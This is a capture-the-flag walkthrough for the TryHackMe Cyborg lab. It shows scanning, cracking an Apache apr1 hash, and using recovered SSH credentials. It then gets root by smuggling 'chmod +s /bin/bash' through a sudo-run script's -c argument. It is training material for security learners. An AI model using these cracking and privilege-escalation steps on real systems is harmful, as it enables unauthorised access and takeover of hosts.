# [Cyborg THM Room](https://tryhackme.com/room/cyborgt8)
## Scanning
### Nmap
```nmap
nmap -sC -sV -oN nmapInitial [ip]
```

```python
Starting Nmap 7.60 ( https://nmap.org ) at 2023-09-19 18:01 BST
Nmap scan report for ip-10-10-139-167.eu-west-1.compute.internal (target-ip)
Host is up (0.0014s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:A5:22:EB:D1:AB (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.62 seconds
```

### Gobuster
```bash
gobuster dir -u http://[ip] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```python
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target-ip
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/09/19 18:04:21 Starting gobuster
===============================================================
/admin (Status: 301)
/etc (Status: 301)
/server-status (Status: 403)
===============================================================
2023/09/19 18:04:45 Finished
===============================================================
```

## Enumeration
### Admin Page
- On the admin page, there is some basic information with links to things like an Instagram and Spotify page.

![IP Admin Panel](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/c08c0f95-62ad-4000-afbf-4eba26c6e70d)


- There is an option to download an archived file with the filename archive.tar. That file can be decompressed using `tar` with the following syntax:
```
tar -xvf archive.tar
```

- Using this syntax to unpack the file, we are presented with the following output:
```
home/field/dev/final_archive/
home/field/dev/final_archive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1
```

- We can navigate through these files and find little pieces of information. For example, the README file gives us the following information (likely contributing to the name of the room):
```
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

- There is also mention of a `/nonce` file in the folder, which I typically associate with encryption. Additionally, we can find the contents of the `config` file beloiw:
```
[repository]
version = 1
segments_per_dir = 1000
max_segment_size = 524288000
append_only = 0
storage_quota = 0
additional_free_space = 0
id = ebb1973fa0114d4ff34180d1e116c913d73ad1968bf375babd0259f74b848d31
key = hqlhbGdvcml0aG2mc2hhMjU2pGRhdGHaAZ6ZS3pOjzX7NiYkZMTEyECo+6f9mTsiO9ZWFV
	L/2KvB2UL9wHUa9nVV55aAMhyYRarsQWQZwjqhT0MedUEGWP+FQXlFJiCpm4n3myNgHWKj
	2/y/khvv50yC3gFIdgoEXY5RxVCXhZBtROCwthh6sc3m4Z6VsebTxY6xYOIp582HrINXzN
	8NZWZ0cQZCFxwkT1AOENIljk/8gryggZl6HaNq+kPxjP8Muz/hm39ZQgkO0Dc7D3YVwLhX
	daw9tQWil480pG5d6PHiL1yGdRn8+KUca82qhutWmoW1nyupSJxPDnSFY+/4u5UaoenPgx
	oDLeJ7BBxUVsP1t25NUxMWCfmFakNlmLlYVUVwE+60y84QUmG+ufo5arj+JhMYptMK2lyN
	eyUMQWcKX0fqUjC+m1qncyOs98q5VmTeUwYU6A7swuegzMxl9iqZ1YpRtNhuS4A5z9H0mb
	T8puAPzLDC1G33npkBeIFYIrzwDBgXvCUqRHY6+PCxlngzz/QZyVvRMvQjp4KC0Focrkwl
	vi3rft2Mh/m7mUdmEejnKc5vRNCkaGFzaNoAICDoAxLOsEXy6xetV9yq+BzKRersnWC16h
	SuQq4smlLgqml0ZXJhdGlvbnPOAAGGoKRzYWx02gAgzFQioCyKKfXqR5j3WKqwp+RM0Zld
	UCH8bjZLfc1GFsundmVyc2lvbgE=
```

- Looking around some more, we can see an `Admin Shoutbox` link when we go to the `Admins` tab on the landing page. It displays the following:

![Admin Shoutbox](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/c164faf7-ee34-4687-8420-fe4e9280dc34)


- Paired with that we have found, the names Josh, Alex, and Adam are all viable names for users we can attempt to use when trying to authenticate via SSH. We could try using something like [Hydra](https://github.com/vanhauser-thc/thc-hydra) to brute force each, but we may be able to find more information via manual enumeration.

- Let's return to our [Gobuster](https://github.com/OJ/gobuster) output and look at the `/etc` directory that was found. Inside, we can see a `/squid` directory, which is referenced on the admin shoutbox page.

![Squid](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/c2a5d7d2-59c4-4a02-b820-7a9d8b1ea9b4)


- There is a `squid.conf` file that contains this:
```
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```
- This looks like proxy parameters, so we won't spend too much time on this at the moment. The `passwd` file is much more interesting. 

- The `/squid` directory contains two files. One is named `passwd` that contains the following:
```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

- After a bit of research, we can determine that this is a hash, and the format is apr1, given the `$apr1$` string. We can use [Hashcat](https://hashcat.net/hashcat/) to get the password with the following sytnax:
```
hashcat -m 1600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt 
```

- The output will look something like the following:
```
hashcat (v6.1.1-66-g6a419d06) starting...

* Device #2: Outdated POCL OpenCL driver detected!

This OpenCL driver has been marked as likely to fail kernel compilation or to produce false negatives.
You can use --force to override this, but do not report related errors.

OpenCL API (OpenCL 1.2 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC 7571, 3832/3896 MB (974 MB allocatable), 2MCU

OpenCL API (OpenCL 1.2 pocl 1.1 None+Asserts, LLVM 6.0.0, SPIR, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
===========================================================================================================================
* Device #2: pthread-AMD EPYC 7571, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 2 secs

$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward  
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
Hash.Target......: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
Time.Started.....: Tue Sep 19 20:36:05 2023 (10 secs)
Time.Estimated...: Tue Sep 19 20:36:15 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     4093 H/s (7.40ms) @ Accel:16 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 38976/14344384 (0.27%)
Rejected.........: 0/38976 (0.00%)
Restore.Point....: 38944/14344384 (0.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidates.#1....: stella123 -> sextoy

Started: Tue Sep 19 20:35:07 2023
Stopped: Tue Sep 19 20:36:16 2023
```

- We can see that the password cracked is `squidward`. 

- To be honest, I had a hard time determining next steps. I did some research into the Borg extraction thing, messed around with brute forcing SSH, but ultimately ended up looking at some of the walkthroughs for guidance. Basically, the syntax to extract the Borg archive are as follows:
```
mkdir unpacked 
borg mount home/field/dev/final_archive unpacked
```
- You must enter the password of `squidward` following the `mount` command. 
***Note: Borg backup must be installed.***

- Afterwards, we can see the backup of a file system for the `alex` user. Navigating to his `/Documents` folder, we can see a `note.txt` that provides us with the following output:
```
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```
- From here, we can SSH into the machine with the discovered credentials. 

## System Hacking
### SSH
- We can connect to the machine and grab the flag with the following syntax:
```
ssh alex@[ip]

cat user.txt
```

## Privilege Escalation
### Checking Permissions
- To begin, I decided to check the users `sudo` permissions with `sudo -l` to see if there was anything exploitable with something simple like [GTFOBins](https://gtfobins.github.io/). I found that there was a file the `alex` user can run as `root` without a password located in `/etc/mp3backup/backup.sh`. Naturally, I looked at the script, which shows the following:

```bash
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
	case "${flag}" in 
		c) command=${OPTARG};;
	esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```

- With some online help, I was able to discover that a `-c` argument can be added to the script, which will then pip the output to the `$cmd` variable. To grab a root shell, use the following syntax:

```bash
sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"
```

- Once done, we can navigate to the `root` directory and grab the `root.txt` flag. 
***Note: Make sure you are in the / directory before running the above or else it will not work.***

## Rabbit Holes
### Config
-  I tried to use the output of the `config` file in the archive to make an id rsa key since the output of the `key` field looked something like that. Unfortunately, that was a waste of time. However, it is important to note that, when using an id_rsa key to authenticate via SSH, change the permissions of the id_rsa file to 600 with `chmod 600 id_rsa`.

### Squid Proxy
- When I first uncovered the credentials, I thought they would lead me to some sort of configuration page via the Squid proxy. I did some googling around to try and find the hash format for the Squid proxy (which uses MD5, by the way), but the formats didn't match. I tried to crack that hash with [Crackstation](https://crackstation.net/), but never got anywhere.

